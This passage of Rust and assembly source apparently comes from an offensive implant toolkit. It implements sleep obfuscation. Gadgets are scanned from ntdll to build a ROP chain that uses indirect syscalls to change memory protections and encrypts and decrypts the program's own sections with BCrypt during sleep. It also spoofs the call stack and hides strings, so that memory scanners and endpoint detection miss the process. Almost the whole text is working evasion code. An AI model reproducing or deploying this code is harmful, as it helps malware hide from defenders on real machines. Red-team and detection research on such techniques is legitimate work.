            let base_addr: *mut *mut c_void = transmute(&pe_base);

            // As BCrypt functions may modify the contents of the IV buffer, it is necessary to allocate one for each operation (encrypt/decrypt)
            let mut allocated_iv1: Box<[u8]> = vec![0; iv_size].into_boxed_slice();
            let mut allocated_iv2: Box<[u8]> = vec![0; iv_size].into_boxed_slice();
            std::ptr::copy_nonoverlapping(aes_iv.as_ptr(), allocated_iv1.as_mut_ptr(), iv_size); 
            std::ptr::copy_nonoverlapping(aes_iv.as_ptr(), allocated_iv2.as_mut_ptr(), iv_size); 
           
            sections_wrapper = SectionsWrapper {
                base_address: base_addr as _,
                total_size: total as _,
                iv_e: Box::into_raw(allocated_iv1) as *mut c_void,
                iv_d: Box::into_raw(allocated_iv2) as *mut c_void,
                n: sections_array.len(),
                sec_size: mem::size_of::<SectionInfo>(),
                sections: sections_array,
            };

        } 
        else 
        {   // Encrypt only the current section

            let b = vec![0u8; size_of::<SYSTEM_INFO>()];
            let si: *mut SYSTEM_INFO = std::mem::transmute(b.as_ptr());
            dinvoke_rs::dinvoke::get_system_info(si);
            let main_address = fluctuate as usize;

            let mut mem = 0usize;
            let max = (*si).lpMaximumApplicationAddress as usize;
           
            let mut page_protection = PAGE_NOACCESS;

            while mem < max
            {
                let buffer = vec![0u8; size_of::<MEMORY_BASIC_INFORMATION>()];
                let buffer: *mut MEMORY_BASIC_INFORMATION = std::mem::transmute(buffer.as_ptr());
                let length = size_of::<MEMORY_BASIC_INFORMATION>();
                let _r = dinvoke_rs::dinvoke::virtual_query_ex(
                    GetCurrentProcess(), 
                    mem as *const c_void, 
                    buffer, 
                    length
                );
                
                if main_address >= ((*buffer).BaseAddress as usize) && main_address <= ((*buffer).BaseAddress as usize + (*buffer).RegionSize )
                {
                    page = (*buffer).BaseAddress as usize;
                    page_length = (*buffer).RegionSize;

                    page_protection = (*buffer).Protect.0;
                    break;
                }

                mem = (*buffer).BaseAddress as usize + (*buffer).RegionSize;
            }

            if page == 0 || page_length == 0 
            {
                return Err(lc!("[X] Error retrieving current section information."));
            }

            // Initialize Sections structure
            let mut sections_array: Vec<SectionInfo> = vec![];

            let mut new_section: SectionInfo = std::mem::zeroed();
            new_section.section_address = transmute(&page);
            new_section.section_size = transmute(&page_length);

            let output = 0u32;
            let output_ptr: *mut u32 = transmute(&output);
            new_section.output = transmute(output_ptr);

            // As BCrypt functions may modify the contents of the IV buffer, it is necessary to allocate one for each operation (encrypt/decrypt)
            let mut allocated_iv1: Box<[u8]> = vec![0; iv_size].into_boxed_slice();
            let mut allocated_iv2: Box<[u8]> = vec![0; iv_size].into_boxed_slice();
            
            std::ptr::copy_nonoverlapping(aes_iv.as_ptr(), allocated_iv1.as_mut_ptr(), iv_size); 
            std::ptr::copy_nonoverlapping(aes_iv.as_ptr(), allocated_iv2.as_mut_ptr(), iv_size); 

            let section_protection: u32;

            if page_protection == PAGE_READONLY {
                section_protection = PAGE_READONLY;
            } else if page_protection  == PAGE_READWRITE {
                section_protection = PAGE_READWRITE;
            } else if page_protection  == PAGE_EXECUTE_READWRITE {
                section_protection = PAGE_EXECUTE_READWRITE;
            } else if page_protection  == PAGE_EXECUTE_READ {
                section_protection = PAGE_EXECUTE_READ;
            } else if page_protection  == PAGE_WRITECOPY {
                section_protection = PAGE_WRITECOPY; 
            } else if page_protection  == PAGE_EXECUTE_WRITECOPY {
                section_protection = PAGE_EXECUTE_WRITECOPY;  
            } else if page_protection  == PAGE_EXECUTE {
                section_protection = PAGE_EXECUTE;
            } else {
                return Err(lc!("[X] Memory permissions error."));
            }

            new_section.original_protection = section_protection as usize;
           
            sections_array.push(new_section);

            sections_wrapper = SectionsWrapper {
                base_address: sections_array[0].section_address,
                total_size: sections_array[0].section_size,
                iv_e: Box::into_raw(allocated_iv1) as *mut c_void,
                iv_d: Box::into_raw(allocated_iv2) as *mut c_void,
                n: 1,
                sec_size: mem::size_of::<SectionInfo>(),
                sections: sections_array,
            };

        }

        let god_gadget: [u8; 12] = [0x58, 0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]; // pop rax; pop rdx; pop rcx; pop r8; pop r9; pop r10; pop r11; ret;
        let gadget_1: [u8;2] = [0x59, 0xc3]; // pop rcx; ret;
        let gadget_2: [u8;4] = [0x5A, 0x41, 0x5B, 0xc3]; // pop rdx; pop r11; ret;
        let gadget_3: [u8;3] = [0x41, 0x58, 0xc3]; // pop r8; ret;
        let gadget_4: [u8;7] = [0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]; // pop r9; pop r10; pop r11; ret;
        let gadget_5: [u8;5] = [0x48, 0x83, 0xC4, 0x58, 0xC3]; // add rsp, 0x58; ret;  -> ideally it would be 0x50, but it can't be found on ntdll
        let gadget_6: [u8;5] = [0x48, 0x83, 0xC4, 0x28, 0xC3]; // add rsp, 0x28; ret;  -> ideally it would be 0x20, but it can't be found on ntdll
        let gadget_7: [u8;1] = [0xC3]; // ret
        let gadget_8: [u8;5] = [0x41, 0x5A, 0x41, 0x5B, 0xC3]; // pop r10; pop r11; ret;
        let gadget_9: [u8;2] = [0x58, 0xC3]; //pop rax; ret;
        
        let mut god_addr = 0usize;
        let mut gag1_addr = 0usize;
        let mut gag2_addr = 0usize;
        let mut gag3_addr = 0usize;
        let mut gag4_addr = 0usize;
        let mut gag5_addr = 0usize;
        let mut gag6_addr = 0usize;
        let mut gag7_addr = 0usize;
        let mut gag8_addr = 0usize;
        let mut gag9_addr = 0usize;

        for section in ntdll_pe_info.sections
        {   
            let s = std::str::from_utf8(&section.Name).unwrap();

            if s.contains(".text")
            {
                let dst: Vec<u8> =vec![0;section.Misc.VirtualSize as usize];
                let dir = ntdll as i64 + section.VirtualAddress as i64;
                copy_nonoverlapping((dir as isize) as *mut u8, dst.as_ptr() as *mut u8, section.Misc.VirtualSize as usize);

                god_addr = ntdll as usize + section.VirtualAddress as usize + 
                                get_gadget_offset(
                                    dst.as_ptr() as *const u8, 
                                    section.Misc.VirtualSize, 
                                    god_gadget.as_ptr(), 
                                    god_gadget.len());

                // If god gadget is not found, then we use regular gadgets
                if god_addr == ntdll as usize + section.VirtualAddress as usize
                {
                    god_addr = 0;

                    gag1_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_1.as_ptr(), 
                                        gadget_1.len());
                    gag2_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_2.as_ptr(), 
                                        gadget_2.len());
                    gag3_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_3.as_ptr(), 
                                        gadget_3.len());
                    gag4_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_4.as_ptr(), 
                                        gadget_4.len());
                    gag8_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_8.as_ptr(), 
                                        gadget_8.len()); 
                    gag9_addr = ntdll as usize + section.VirtualAddress as usize + 
                                    get_gadget_offset(
                                        dst.as_ptr() as *const u8, 
                                        section.Misc.VirtualSize, 
                                        gadget_9.as_ptr(), 
                                        gadget_9.len());      
                    
                }

                gag5_addr = ntdll as usize + section.VirtualAddress as usize + 
                                get_gadget_offset(
                                    dst.as_ptr() as *const u8, 
                                    section.Misc.VirtualSize, 
                                    gadget_5.as_ptr(), 
                                    gadget_5.len()); 
                gag6_addr = ntdll as usize + section.VirtualAddress as usize + 
                                get_gadget_offset(
                                    dst.as_ptr() as *const u8, 
                                    section.Misc.VirtualSize, 
                                    gadget_6.as_ptr(), 
                                    gadget_6.len());  
                gag7_addr = ntdll as usize + section.VirtualAddress as usize + 
                                get_gadget_offset(
                                    dst.as_ptr() as *const u8, 
                                    section.Misc.VirtualSize, 
                                    gadget_7.as_ptr(), 
                                    gadget_7.len());                                             
            }
        }

        if god_addr == 0 && (gag1_addr == 0 || gag2_addr == 0 || gag3_addr == 0 || gag4_addr == 0 || gag5_addr == 0 || gag6_addr == 0 || gag7_addr == 0 || gag8_addr == 0 || gag9_addr == 0)
        {
            return Err(lc!("[X] Gadget not found."));
        }
        
        if god_addr == 1 && (gag5_addr == 0 || gag6_addr == 0 || gag7_addr == 0)
        {
            return Err(lc!("[X] Gadget not found."));
        }

        // ROP Configuration
        //  Gadgets
        configuration.god_gadget = god_addr as *mut _;
        configuration.gadget1 = gag1_addr as *mut _;
        configuration.gadget2 = gag2_addr as *mut _;
        configuration.gadget3 = gag3_addr as *mut _;
        configuration.gadget4 = gag4_addr as *mut _;
        configuration.gadget5 = gag5_addr as *mut _;
        configuration.gadget6 = gag6_addr as *mut _;
        configuration.gadget7 = gag7_addr as *mut _;
        configuration.gadget8 = gag8_addr as *mut _;
        configuration.gadget9 = gag9_addr as *mut _;

        //  NtProtectVirtualMemory
        let protection = dinvoke_rs::data::PAGE_READWRITE as usize;
        let current_process_handle: HANDLE = HANDLE(-1);

        configuration.ntprotectvm = syscall_addr1 as usize;
        configuration.ntprotectvm_id = ntpvm_id as isize;
        configuration.processhandle = current_process_handle;
        configuration.memory_protections = protection as usize;

        //  CreateEventW
        let function: CreateEventW;
        let ret: Option<HANDLE>;
        let objhandle: HANDLE;

        let mut config_is_handle_provided: bool = false;
        match event_handle {
            Some(h) => {
                config_is_handle_provided = true;
                objhandle = h;
            },
            None => {
                dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("CreateEventW"),function,ret,ptr::null_mut(),0,0,ptr::null());
                match ret {
                    Some(h) => {
                        objhandle = h;
                    },
                    None => {
                        return Err(lc!("[X] Error calling CreateEventW."));
                    },
                }
            },
        }

        //  NtWaitForSingleObject
        let delay_value: i64;
        let delay: *mut isize;

        match config_delay {
            Some(seconds) => {
                delay_value = seconds as i64 * -10000000;
                delay = transmute(&delay_value);
            },
            None => {
                // If a value is not specified, the timeout will be Infinite
                delay = std::ptr::null_mut();
            }
        }
        
        configuration.ntwaitobj = syscall_addr2 as usize;
        configuration.ntwaitobj_id = ntwaitobj_id as isize;
        configuration.objhandle = objhandle;
        configuration.delay = delay as *mut isize;

        //  Encryption
        configuration.key_handle = transmute(key_handle);
        configuration.iv_len = iv_size;
        let output_var = 0u32;
        let output_var_ptr: *mut u32 = transmute(&output_var);
        configuration.output_var = transmute(output_var_ptr);
       
        let bcryptencrypt_addr = dinvoke_rs::dinvoke::get_function_address(bcrypt, &lc!("BCryptEncrypt"));
        configuration.bencrypt = bcryptencrypt_addr as usize;
 
        let bcryptdecrypt_addr = dinvoke_rs::dinvoke::get_function_address(bcrypt, &lc!("BCryptDecrypt"));
        configuration.bdecrypt = bcryptdecrypt_addr as usize;

        // Call Unwinder::SpoofAndCall to get a clean call stack for the rop chain
        let rop_configuration: PVOID = transmute(&configuration);
        let sections_configuration: PVOID = transmute(&sections_wrapper);
        let encrypt_addr: *mut c_void = Fluctuate as _;
        
        let unwinder_addr = unwinder::spoof_and_call as usize;
        let mut args: Vec<*mut c_void> = vec![];
        let keep_start_address_frame = false;
        let keep_start_address_frame_ptr = keep_start_address_frame as usize;
        args.push(encrypt_addr);
        args.push(keep_start_address_frame_ptr as _);
        args.push(rop_configuration);
        args.push(sections_configuration);

        let _ = SpoofAndCall(unwinder_addr, args, false, 0);
       
        // Clean Up
        if !config_is_handle_provided {
            // Close the event handle
            let _ = dinvoke_rs::dinvoke::close_handle(objhandle);
        }

        let flags = 0;
        let f: BCryptCloseAlgorithmProvider;
        let _r: Option<i32>;
        // Close handle to the encryption algorithm provider
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptCloseAlgorithmProvider"),f,_r,*alg_handle,flags);
        
        let f: BCryptDestroyKey;
        let _r: Option<i32>;
        // Destroy encryption key
        dinvoke_rs::dinvoke::dynamic_invoke!(bcrypt,&lc!("BCryptDestroyKey"),f,_r,*key_handle);

        // Allow the destructor to free the allocated memory
        let _ = Box::from_raw(sections_wrapper.iv_e);
        let _ = Box::from_raw(sections_wrapper.iv_d);

        if config_encrypt_all_sections {
            for sect in &sections_wrapper.sections{
                let _ = Box::from_raw((*sect).section_address);
                let _ = Box::from_raw((*sect).section_size);
                let _ = Box::from_raw((*sect).output);
            }
        }
   }

   Ok(())
   
}

fn get_gadget_offset(base_address: *const u8, section_size: u32,  gadget: *const u8, gadget_len: usize) -> usize
{   
    unsafe
    {
        let mut found = false;
        let mut ptr = base_address;

        for i in 0..section_size as usize
        { 
            for j in 0..gadget_len
            {
                let t = ptr.add(j); 
                let temp_1 = *(t);
                let t2 = gadget.add(j); 
                let temp_2 = *(t2);
                if temp_1 == temp_2
                {
                    if found && j as i32 == (gadget_len as i32 - 1)
                    {
                        let offset = base_address.add(i) as usize - base_address as usize;
                        return offset;
                    }
                    found = true;
                }
                else 
                {
                    found = false;   
                    break;
                }
            }
            ptr = ptr.add(1);

        }
    }  
    0
}

/// Retrieves PE headers information from the module base address.
///
/// It will return either a dinvoke_rs::data::PeMetada struct containing the PE
/// metadata or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let file_content = fs::read("c:\\windows\\system32\\ntdll.dll").expect("[x] Error opening the specified file.");
/// let file_content_ptr = file_content.as_ptr();
/// let result = manualmap::get_pe_metadata(file_content_ptr);
/// ```
fn get_pe_metadata (module_ptr: *const u8) -> Result<PeMetadata,String> {
    
    let mut pe_metadata= PeMetadata::default();

    unsafe {

        let e_lfanew = *((module_ptr as u64 + 0x3C) as *const u32);
        pe_metadata.image_file_header = *((module_ptr as u64 + e_lfanew as u64 + 0x4) as *mut ImageFileHeader);

        let opt_header: *const u16 = (module_ptr as u64 + e_lfanew as u64 + 0x18) as *const u16; 
        let pe_arch = *(opt_header);

        if pe_arch == 0x010B
        {
            pe_metadata.is_32_bit = true;
            let opt_header_content: *const IMAGE_OPTIONAL_HEADER32 = std::mem::transmute(opt_header);
            pe_metadata.opt_header_32 = *opt_header_content;
        }
        else if pe_arch == 0x020B 
        {
            pe_metadata.is_32_bit = false;
            let opt_header_content: *const ImageOptionalHeader64 = std::mem::transmute(opt_header);
            pe_metadata.opt_header_64 = *opt_header_content;
        } 
        else 
        {
            return Err(lc!("[x] Invalid magic value."));
        }

        let mut sections: Vec<IMAGE_SECTION_HEADER> = vec![];

        for i in 0..pe_metadata.image_file_header.number_of_sections
        {
            let section_ptr = (opt_header as u64 + pe_metadata.image_file_header.size_of_optional_header as u64 + (i * 0x28) as u64) as *const u8;
            let section_ptr: *const IMAGE_SECTION_HEADER = std::mem::transmute(section_ptr);
            sections.push(*section_ptr);
        }

        pe_metadata.sections = sections;

        Ok(pe_metadata)
    }
}

fn get_syscall_addr (base_address: isize) -> usize {

    let syscall_hex: [u8; 3] = [0x0f, 0x05, 0xC3];
    let offset;
   
    offset = get_gadget_offset(
        base_address as *const u8, 
        0x15 as u32, 
        syscall_hex.as_ptr(), 
        syscall_hex.len());

    if offset == 0 {
        return offset;
    } else {
        let gadget = base_address as usize + offset;
        return gadget;
    }
}

fn get_random_syscall (eat: &EAT,) -> usize {
   
    let mut rng = WyRand::new();
    if !eat.is_empty() {
        
        let mut address;
        let mut gadget;
    
        loop 
        {
            address = 0;
            while address == 0
            {
                let n: usize = rng.generate_range(0..eat.len()) as usize;
                let pair = eat.iter().skip(n).next().unwrap();
                address = *(pair.0);
            }

            gadget = get_syscall_addr(address);

            if gadget != 0 {
                break;
            }  
        } 

        return gadget;
    }

    return 0;
    
}

// The method used to locate the PE's base address consists on scanning the memory regions near the
// current function for the closest "MZ" header bytes. This is unreliable  
// because if they are not present, the nearest one would be chosen, which could be from
// another PE. Therefore a threshold representing the maximum number of memory
// regions to scan is set, as the header should be relatively close to the address.
fn get_pe_baseaddress (threshold: u32, pattern: [u8;2]) -> usize {
    unsafe
    {   
        let mut regions: Vec<(usize, usize)> = Vec::new();
        let mut regions_size: u32 = 0;

        let mut base_address: usize = 0;

        let b = vec![0u8; size_of::<SYSTEM_INFO>()];
        let si: *mut SYSTEM_INFO = std::mem::transmute(b.as_ptr());
        dinvoke_rs::dinvoke::get_system_info(si);

        let main_address = fluctuate as usize;

        let mut mem = 0usize;
        let max = (*si).lpMaximumApplicationAddress as usize;
        
        while mem < max
        {
            let buffer = vec![0u8; size_of::<MEMORY_BASIC_INFORMATION>()];
            let buffer: *mut MEMORY_BASIC_INFORMATION = std::mem::transmute(buffer.as_ptr());
            let length = size_of::<MEMORY_BASIC_INFORMATION>();
            let _r = dinvoke_rs::dinvoke::virtual_query_ex(
                GetCurrentProcess(), 
                mem as *const c_void, 
                buffer, 
                length
            );       

            let is_readable: bool = (*buffer).Protect.0 == PAGE_READONLY || (*buffer).Protect.0 == PAGE_READWRITE || (*buffer).Protect.0 == PAGE_EXECUTE_READ || (*buffer).Protect.0 == PAGE_EXECUTE_READWRITE;
            
            if is_readable
            {
                regions.push(((*buffer).BaseAddress as usize, (*buffer).RegionSize));
                regions_size += 1;

                if main_address >= ((*buffer).BaseAddress as usize) && main_address <= ((*buffer).BaseAddress as usize + (*buffer).RegionSize )
                {
                    break;
                }
                
            }
            mem = (*buffer).BaseAddress as usize + (*buffer).RegionSize;
        }

        let mut i: i32 = regions_size as i32 - 1;

        let mut threshold_c = threshold;
        while (i >= 0) && (threshold_c > 0) {

            let region = regions[i as usize];

            let t1: [u8;2] = pattern;
            let t1= t1.as_ptr();
            let t2 = region.0 as *const u8;

            if *(t1) == *(t2) {
                let t1 = t1.add(1);
                let t2 = t2.add(1);

                if *(t1) == *(t2) {
                    base_address = region.0 as usize;
                    break;
                }
            }
            i -= 1;
            threshold_c -= 1;
        }
        
        return base_address;
    }
}

fn align_to_mempage(vsize: usize) -> usize {
    if vsize % 4096 == 0 
    {
        return vsize;
    }
    else
    {
        return ((vsize / 4096) + 1) * 4096;
    }
}
```

`src/stub.asm`:

```asm
.data

RopConfiguration STRUCT
    god_gadget             DQ 1
    gadget1             DQ 1
    gadget2             DQ 1
    gadget3             DQ 1
    gadget4             DQ 1
    gadget5             DQ 1
    gadget6             DQ 1
    gadget7             DQ 1
    gadget8             DQ 1
    gadget9             DQ 1

    ntprotectvm             DQ 1
    ntprotectvm_id             DQ 1
    processhandle             DQ 1
    memory_protections             DQ 1

    ntwaitobj             DQ 1
    ntwaitobj_id             DQ 1
    objhandle             DQ 1
    delay             DQ 1
    
    bencrypt             DQ 1
    bdecrypt             DQ 1
    key_handle             DQ 1 
    iv_len             DQ 1
    output_var             DQ 1
RopConfiguration ENDS

SectionInfo STRUCT
    section_address             DQ 1
    section_size             DQ 1
    original_protection             DQ 1
    output             DQ 1
SectionInfo ENDS

SectionsWrapper STRUCT
    base_address             DQ 1
    total_size             DQ 1
    iv_e             DQ 1
    iv_d             DQ 1
    n             DQ 1
    sec_size             DQ 1
    sections             DQ 1
SectionsWrapper ENDS


.code

    Fluctuate PROC
        mov r8, [rcx].RopConfiguration.key_handle     ; R8 contains key_handle*
        mov r13, [rcx].RopConfiguration.god_gadget    ; R13 will contain the address of GodGadget or 0 if it wasn't found
        mov r14, [rdx].SectionsWrapper.n              ; R14 contains the number of sections
        mov r15, [rdx].SectionsWrapper.sections       ; R15 contains the address of the current section in the loop
        
    loop_protect_1:  
        test r14, r14
        jz end_protect_1

        ; ----- NTProtectVirtualMemory
        push [r15].SectionInfo.output
        push 0
        push 0
        push 0
        push 0
        push [rcx].RopConfiguration.gadget6
        push [rcx].RopConfiguration.ntprotectvm

        test r13, r13
        jz loop_protect_1_regular

        push 0
        push [rcx].RopConfiguration.processhandle
        push [r15].SectionInfo.original_protection
        push [r15].SectionInfo.section_size
        push [rcx].RopConfiguration.processhandle
        push [r15].SectionInfo.section_address
        push [rcx].RopConfiguration.ntprotectvm_id
        push [rcx].RopConfiguration.god_gadget
        jmp loop_protect_1_next

    loop_protect_1_regular:
        push [rcx].RopConfiguration.ntprotectvm_id
        push [rcx].RopConfiguration.gadget9

        push 0
        push [rcx].RopConfiguration.processhandle
        push [rcx].RopConfiguration.gadget8

        push 0
        push 0
        push [r15].SectionInfo.original_protection
        push [rcx].RopConfiguration.gadget4

        push [r15].SectionInfo.section_size
        push [rcx].RopConfiguration.gadget3

        push 0
        push [r15].SectionInfo.section_address
        push [rcx].RopConfiguration.gadget2

        push [rcx].RopConfiguration.processhandle
        push [rcx].RopConfiguration.gadget1
        ; -----

    loop_protect_1_next:
        add r15, [rdx].SectionsWrapper.sec_size
        dec r14
        jmp loop_protect_1
    end_protect_1:

        ; ----- Stack alignment
        ; R10 will be set to 1 if the number of sections is odd
        mov r10, [rdx].SectionsWrapper.n
        and r10, 1
       
    crypt_1: 
        test r13, r13
        jz no_godgadget

        test r10, r10
        jz godgadget_even

        ; If GodGadget is present and N is odd, add the alignment gadget
        jmp alignment_gadget

        ; If GodGadget is present and N is even, skip the alignment gadget
        godgadget_even:
            jmp continue_crypt_1

        no_godgadget:
            ; If GodGadget is not present and N is even, skip the alignment gadget
            test r10, r10
            jz continue_crypt_1

            ; If GodGadget is not present and N is odd, add the alignment gadget

    alignment_gadget:
        push [rcx].RopConfiguration.gadget7
        ; -----

    continue_crypt_1:
        mov r14, [rdx].SectionsWrapper.base_address
        mov r15, [rdx].SectionsWrapper.total_size

        ; ----- BDecrypt
        push 0
        push 0
        push [rcx].RopConfiguration.output_var
        push [r15]
        push [r14]
        push [rcx].RopConfiguration.iv_len
        push [rdx].SectionsWrapper.iv_d
        push 0
        push 0
        push 0
        push 0
        push [rcx].RopConfiguration.gadget5
        push [rcx].RopConfiguration.bdecrypt

        test r13, r13
        jz crypt_1_regular

        push 0
        push 0
        push 0
        push [r15]
        push [r8]
        push [r14]
        push 0
        push [rcx].RopConfiguration.god_gadget
        jmp end_crypt_1

    crypt_1_regular:
        push 0
        push 0
        push 0
        push [rcx].RopConfiguration.gadget4

        push [r15]
        push [rcx].RopConfiguration.gadget3

        push 0
        push [r14]
        push [rcx].RopConfiguration.gadget2

        push [r8]
        push [rcx].RopConfiguration.gadget1
        ; -----

    end_crypt_1:

        ; ----- NtWaitForSingleObject
        push 0
        push 0
        push 0
        push 0
        push 0
        push [rcx].RopConfiguration.gadget6
        push [rcx].RopConfiguration.ntwaitobj
        
        test r13, r13
        jz wait_for_single_object_regular

        push 0
        push [rcx].RopConfiguration.objhandle
        push 0
        push [rcx].RopConfiguration.delay
        push [rcx].RopConfiguration.objhandle
        push 0
        push [rcx].RopConfiguration.ntwaitobj_id
        push [rcx].RopConfiguration.god_gadget
        jmp crypt_2

    wait_for_single_object_regular:
        push [rcx].RopConfiguration.ntwaitobj_id
        push [rcx].RopConfiguration.gadget9

        push 0
        push [rcx].RopConfiguration.objhandle
        push [rcx].RopConfiguration.gadget8
        
        push [rcx].RopConfiguration.delay
        push [rcx].RopConfiguration.gadget3

        push 0
        push 0
        push [rcx].RopConfiguration.gadget2

        push [rcx].RopConfiguration.objhandle
        push [rcx].RopConfiguration.gadget1
        ; -----

    crypt_2: 
        mov r14, [rdx].SectionsWrapper.base_address
        mov r15, [rdx].SectionsWrapper.total_size

        ; ----- BEncrypt
        push 0
        push 0
        push [rcx].RopConfiguration.output_var
        push [r15]
        push [r14]
        push [rcx].RopConfiguration.iv_len
        push [rdx].SectionsWrapper.iv_e
        push 0
        push [r14]
        push [r14]
        push [r8]
        push [rcx].RopConfiguration.gadget5
        push [rcx].RopConfiguration.bencrypt

        test r13, r13
        jz crypt_2_regular

        push 0
        push 0
        push 0
        push [r15]
        push [r8]
        push [r14]
        push 0
        push [rcx].RopConfiguration.god_gadget
        jmp end_crypt_2

    crypt_2_regular:
        push 0
        push 0
        push 0
        push [rcx].RopConfiguration.gadget4

        push[r15]
        push [rcx].RopConfiguration.gadget3

        push 0
        push [r14]
        push [rcx].RopConfiguration.gadget2

        push [r8]
        push [rcx].RopConfiguration.gadget1
        ; -----

    end_crypt_2:

        ; ----- NTProtectVirtualMemory 
        push [rcx].RopConfiguration.output_var
        push 0
        push 0
        push 0
        push 0
        push [rcx].RopConfiguration.gadget6
        push [rcx].RopConfiguration.ntprotectvm

        test r13, r13
        jz protect_2_regular

        push 0
        push [rcx].RopConfiguration.processhandle
        push [rcx].RopConfiguration.memory_protections
        push [rdx].SectionsWrapper.total_size
        push [rcx].RopConfiguration.processhandle
        push [rdx].SectionsWrapper.base_address
        push [rcx].RopConfiguration.ntprotectvm_id
        push [rcx].RopConfiguration.god_gadget
        jmp end_protect_2

    protect_2_regular:

        push [rcx].RopConfiguration.ntprotectvm_id
        push [rcx].RopConfiguration.gadget9

        push 0
        push [rcx].RopConfiguration.processhandle
        push [rcx].RopConfiguration.gadget8

        push 0
        push 0
        push [rcx].RopConfiguration.memory_protections
        push [rcx].RopConfiguration.gadget4

        push [rdx].SectionsWrapper.total_size
        push [rcx].RopConfiguration.gadget3

        push 0
        push [rdx].SectionsWrapper.base_address
        push [rcx].RopConfiguration.gadget2

        push [rcx].RopConfiguration.processhandle
        push [rcx].RopConfiguration.gadget1
        ; -----

    end_protect_2:
        ret
    Fluctuate ENDP

    SpoofAndCall PROC
        push rbp
        push rbx
        push rdi
        push rsi
        push r12
        push r13
        push r14
        push r15

        push 0              ; 16 byte stack alignment
        mov rax, rcx        ; Move unwinder::spoof_and_call's address to rax
        mov rcx, rdx        ; Set up parameters according to the calling convention
        mov rdx, r8
        mov r8, r9
        call qword ptr rax  ; Call unwinder::spoof_and_call

        pop r15
        pop r15
        pop r14
        pop r13
        pop r12
        pop rsi
        pop rdi
        pop rbx
        pop rbp
        ret
    SpoofAndCall ENDP

end
```